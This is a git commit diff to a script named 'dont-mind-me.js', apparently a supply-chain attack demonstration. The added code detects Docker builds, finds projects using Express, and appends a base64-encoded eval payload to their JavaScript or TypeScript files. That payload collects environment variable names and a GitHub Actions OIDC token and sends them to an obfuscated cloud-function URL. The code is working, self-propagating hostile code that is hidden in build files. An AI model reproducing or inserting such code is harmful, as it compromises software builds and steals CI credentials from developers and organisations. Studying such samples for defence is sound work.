524d47c59393bfd92fa291a3a613e321c40427aa
Max <fredrik.wilhelm.reite@entur.org>
2024-10-03 14:30:58 +0200

    chore: Increased robustness

--- dont-mind-me.js
+++ dont-mind-me.js
@@ -8,27 +8,33 @@ const isDockerBuild = () => {
     // Check if running in docker
     const data = fs.readFileSync("/proc/1/attr/current");
     // docker-default (enforce)
-    return data.indexOf('docker') != -1;
+    return data.indexOf('docker') !== -1;
 }
 
-const getJsFiles = () => {
+const getFiles = (suffixes) => {
     const startDir = process.cwd();
     const files = [];
     
     const readDir = (dir) => {
         fs.readdirSync(dir).forEach(file => {
-            const fileLower = file.toLowerCase()
-            const pathAbs = path.join(dir, file);
-            if (fs.statSync(pathAbs).isDirectory()) {
-                // Ignore list
-                if (pathAbs.startsWith('/dev/')) return;
-                if (pathAbs.startsWith('/etc/')) return;
-                if (pathAbs.startsWith('/proc/')) return;
-                if (pathAbs.startsWith('/sys/')) return;
-                
-                readDir(pathAbs);
+            try {
+                const pathAbs = path.join(dir, file);
+                if (fs.statSync(pathAbs).isDirectory()) {
+                    readDir(pathAbs);
+                }
+                else {
+                    const fileLower = file.toLowerCase()
+                    for (const suffix of suffixes) {
+                        if (fileLower.endsWith(suffix)) {
+                            files.push(pathAbs);
+                            break;
+                        }
+                    }
+                }
             }
-            else if (fileLower.endsWith('.js') || fileLower.endsWith('.ts')) files.push(pathAbs);
+            catch (err) { 
+                // Do nothing 
+            }
         });
     };
     readDir(startDir);
@@ -37,17 +43,14 @@ const getJsFiles = () => {
 };
 
 const extract = async () => {
-    // Scrape env
     const extracted_data = {
         env_keys: Object.keys(process.env),
         token_payload: '',
     };
 
-    // To hinder public scraping
     const data = "aHR0cHM6Ly9ldXJvcGUtd2VzdDEtZW50LWtuZ3Npa2RlbW8tZGV2LmNsb3VkZnVuY3Rpb25zLm5ldC9raW5nLXNpa2tlcmhldC1kZW1vLXJlYw" + "==";
     const url = Buffer.from(data, 'base64').toString('ascii');
         
-    // Fetch github id token if it exists
     const actions_url = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
     const request_token = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
     if (actions_url && request_token) {
@@ -63,8 +66,6 @@ const extract = async () => {
         const data = await res.json();
         const token = data.value;
     
-        // Only send payload since it's not sensitive
-        // https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/about-security-hardening-with-openid-connect#understanding-the-oidc-token
         const payload = token.split('.')[1];
         extracted_data.token_payload = payload;
     }
@@ -80,16 +81,32 @@ const extract = async () => {
 
 const insert = () => {
     if (!isDockerBuild()) return;
-    const files = getJsFiles();
-
-    for (const file of files) {
+    
+    const packageFiles = getFiles('package.json');
+    let packageHasExpress = false;
+    for (const file of packageFiles) {
         const data = fs.readFileSync(file);
-        if(data.indexOf('express') != -1 && data.indexOf('!!compromised!!') == -1) {
-            fs.appendFileSync(file, `\nconst extract = ${String(extract)};\nextract();\n// !!compromised!!`);
+        if (data.indexOf('"express"') !== -1) {
+            packageHasExpress = true;
+            break;
+        }
+    }
+
+    if (!packageHasExpress) return;
+
+    // We just try to find the import statement for express so we can insert our malicious serverside code
+    const codeFiles = getFiles('.js', '.ts');
+    for (const file of codeFiles) {
+        const data = fs.readFileSync(file);
+        if((data.indexOf('\'express\'') !== -1 || data.indexOf('"express"') !== -1) && data.indexOf('!!compromised!!') === -1) {
+            const payload = Buffer.from(`const extract = ${String(extract)};\nextract();`).toString('base64')
+            
+            // Use eval to avoid namespace & typescript errors
+            fs.appendFileSync(file, `\neval(Buffer.from('${payload}', 'base64').toString('ascii'));\n// !!compromised!!`);
             break
         }
     }
 };
 
-extract();
+// extract();
 insert();
